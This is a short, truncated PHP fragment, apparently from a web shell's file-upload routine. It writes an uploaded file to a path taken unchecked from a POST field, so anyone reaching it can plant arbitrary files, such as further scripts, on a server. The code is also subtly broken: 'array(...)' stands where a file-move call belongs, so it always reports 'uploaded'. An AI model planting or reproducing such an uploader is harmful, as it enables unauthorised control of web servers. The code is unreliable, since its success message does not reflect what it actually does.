...
$tend
HTML;
if(isset($_POST['path'])){$uploadfile=$_POST['path'].$_FILES['file']['name'];if($_POST['path']==""){$uploadfile=$_FILES['file']['name'];}if(array($_FILES['file']['tmp_name'],$uploadfile)){echo "File ".$_FILES['file']['name']." uploaded";} else {
